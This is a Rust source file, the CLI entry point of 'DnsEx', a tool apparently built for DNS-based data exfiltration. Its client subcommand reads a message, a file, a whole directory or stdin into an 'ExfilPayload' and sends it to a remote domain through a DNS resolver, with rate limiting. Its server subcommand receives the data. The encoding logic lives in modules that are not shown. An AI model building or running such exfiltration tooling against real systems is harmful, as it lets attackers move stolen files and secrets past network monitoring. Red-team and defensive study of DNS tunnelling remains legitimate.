use clap::{Parser, Subcommand};
use client::{Client, ClientConfig, ExfilPayload};
use error::DnsexError;
use server::Server;
use std::path::Path;
use tokio::fs;
use tokio::io::{self, AsyncReadExt};

mod client;
mod error;
mod handler;
mod server;
mod utils;

#[derive(Parser, Debug)]
#[command(author, version, about = "DnsEx - Created by coigner <coigner@tuta.com>", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    Server {
        #[arg(short, long)]
        domain: String,

        #[arg(short, long, default_value = "0.0.0.0")]
        bind: String,

        #[arg(short, long, default_value_t = 8053)]
        port: u16,
    },

    Client {
        #[arg(short, long)]
        domain: String,

        #[arg(long, default_value = "8.8.8.8")]
        resolver: String,

        #[arg(short, long, default_value_t = 8053)]
        port: u16,

        #[arg()]
        message: Option<String>,

        #[arg(short, long)]
        file: Option<String>,

        #[arg(long, default_value_t = 100)]
        rate_limit: u64,

        #[arg(long)]
        progress: bool,
    },
}

#[tokio::main]
async fn main() -> Result<(), DnsexError> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Server { domain, bind, port } => {
            let server = Server::new(domain, bind, port);
            server.start().await?;
        }

        Commands::Client {
            domain,
            resolver,
            port,
            message,
            file,
            rate_limit,
            progress,
        } => {
            let payload = if let Some(msg) = message {
                ExfilPayload {
                    filename: "message.txt".into(),
                    data: msg.into_bytes(),
                    is_directory: false,
                }
            } else if let Some(path) = file {
                let path = Path::new(&path);
                let (data, is_directory) = if path.is_dir() {
                    (utils::encode_dir(path).await?, true)
                } else {
                    (fs::read(&path).await?, false)
                };

                ExfilPayload {
                    filename: path.into(),
                    data,
                    is_directory,
                }
            } else {
                let mut buf = Vec::new();
                let mut stdin = io::stdin();
                stdin.read_to_end(&mut buf).await?;

                ExfilPayload {
                    filename: "stdin.bin".into(),
                    data: buf,
                    is_directory: false,
                }
            };

            let client_config = ClientConfig {
                domain,
                resolver_ip: resolver,
                port,
                rate_limit_ms: rate_limit,
                progress,
            };

            let client = Client::new(client_config);
            let _ = client.send_payload(payload).await?;
        }
    };

    Ok(())
}
